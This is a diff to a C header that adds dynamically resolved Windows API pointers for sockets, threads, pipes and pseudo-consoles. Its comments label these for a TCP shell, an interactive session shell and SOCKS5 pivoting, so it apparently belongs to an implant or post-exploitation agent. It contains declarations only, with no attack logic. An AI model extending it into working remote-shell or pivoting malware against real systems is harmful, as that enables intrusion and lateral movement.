@@ -1,5 +1,7 @@
 #pragma once
+#include <winsock2.h>
 #include <windows.h>
+#include <ws2tcpip.h>
 #include <winhttp.h>
 #include <bcrypt.h>
 #include <tlhelp32.h>
@@ -246,5 +248,80 @@ typedef LPVOID (WINAPI *PFN_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 extern PFN_VirtualAlloc fnVirtualAlloc;
 typedef BOOL (WINAPI *PFN_VirtualFree)(LPVOID, SIZE_T, DWORD);
 extern PFN_VirtualFree fnVirtualFree;
+
+/* Winsock2 — session mode */
+typedef int (WSAAPI *PFN_WSAStartup)(WORD, LPWSADATA);
+extern PFN_WSAStartup fnWSAStartup;
+typedef int (WSAAPI *PFN_WSACleanup)(void);
+extern PFN_WSACleanup fnWSACleanup;
+typedef SOCKET (WSAAPI *PFN_socket)(int, int, int);
+extern PFN_socket fnSocket;
+typedef int (WSAAPI *PFN_connect)(SOCKET, const struct sockaddr*, int);
+extern PFN_connect fnConnect;
+typedef int (WSAAPI *PFN_send)(SOCKET, const char*, int, int);
+extern PFN_send fnSend;
+typedef int (WSAAPI *PFN_recv)(SOCKET, char*, int, int);
+extern PFN_recv fnRecv;
+typedef int (WSAAPI *PFN_closesocket)(SOCKET);
+extern PFN_closesocket fnClosesocket;
+
+/* Winsock2 — shell TCP */
+typedef unsigned long (WSAAPI *PFN_inet_addr)(const char *cp);
+extern PFN_inet_addr fnInet_addr;
+typedef u_short (WSAAPI *PFN_htons)(u_short hostshort);
+extern PFN_htons fnHtons;
+
+/* Winsock2 — SOCKS5 pivoting */
+typedef INT (WSAAPI *PFN_getaddrinfo)(PCSTR pNodeName, PCSTR pServiceName,
+    const ADDRINFOA *pHints, PADDRINFOA *ppResult);
+extern PFN_getaddrinfo fnGetaddrinfo;
+typedef void (WSAAPI *PFN_freeaddrinfo)(PADDRINFOA pAddrInfo);
+extern PFN_freeaddrinfo fnFreeaddrinfo;
+typedef int (WSAAPI *PFN_ioctlsocket)(SOCKET s, long cmd, u_long *argp);
+extern PFN_ioctlsocket fnIoctlsocket;
+typedef int (WSAAPI *PFN_select)(int nfds, fd_set *readfds, fd_set *writefds,
+    fd_set *exceptfds, const struct timeval *timeout);
+extern PFN_select fnSelect;
+
+/* Kernel32 — threading (session mode) */
+typedef HANDLE (WINAPI *PFN_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+extern PFN_CreateThread fnCreateThread;
+typedef void (WINAPI *PFN_InitializeCriticalSection)(LPCRITICAL_SECTION);
+extern PFN_InitializeCriticalSection fnInitializeCriticalSection;
+typedef void (WINAPI *PFN_EnterCriticalSection)(LPCRITICAL_SECTION);
+extern PFN_EnterCriticalSection fnEnterCriticalSection;
+typedef void (WINAPI *PFN_LeaveCriticalSection)(LPCRITICAL_SECTION);
+extern PFN_LeaveCriticalSection fnLeaveCriticalSection;
+typedef void (WINAPI *PFN_DeleteCriticalSection)(LPCRITICAL_SECTION);
+extern PFN_DeleteCriticalSection fnDeleteCriticalSection;
+typedef DWORD (WINAPI *PFN_WaitForMultipleObjects)(DWORD, const HANDLE*, BOOL, DWORD);
+extern PFN_WaitForMultipleObjects fnWaitForMultipleObjects;
+
+/* Kernel32 — process/pipe extras (session shell) */
+typedef BOOL (WINAPI *PFN_PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
+extern PFN_PeekNamedPipe fnPeekNamedPipe;
+typedef BOOL (WINAPI *PFN_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+extern PFN_CreateProcessW fnCreateProcessW;
+
+/* Kernel32 — ConPTY (session shell) */
+typedef void* HPCON;
+typedef HRESULT (WINAPI *PFN_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
+extern PFN_CreatePseudoConsole fnCreatePseudoConsole;
+typedef void (WINAPI *PFN_ClosePseudoConsole)(HPCON);
+extern PFN_ClosePseudoConsole fnClosePseudoConsole;
+typedef HRESULT (WINAPI *PFN_ResizePseudoConsole)(HPCON, COORD);
+extern PFN_ResizePseudoConsole fnResizePseudoConsole;
+typedef BOOL (WINAPI *PFN_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
+extern PFN_InitializeProcThreadAttributeList fnInitializeProcThreadAttributeList;
+typedef BOOL (WINAPI *PFN_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
+extern PFN_UpdateProcThreadAttribute fnUpdateProcThreadAttribute;
+typedef void (WINAPI *PFN_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
+extern PFN_DeleteProcThreadAttributeList fnDeleteProcThreadAttributeList;
+typedef LPVOID (WINAPI *PFN_HeapAlloc)(HANDLE, DWORD, SIZE_T);
+extern PFN_HeapAlloc fnHeapAlloc;
+typedef HANDLE (WINAPI *PFN_GetProcessHeap)(void);
+extern PFN_GetProcessHeap fnGetProcessHeap;
+typedef BOOL (WINAPI *PFN_HeapFree)(HANDLE, DWORD, LPVOID);
+extern PFN_HeapFree fnHeapFree;
 
 void resolve_apis(void);
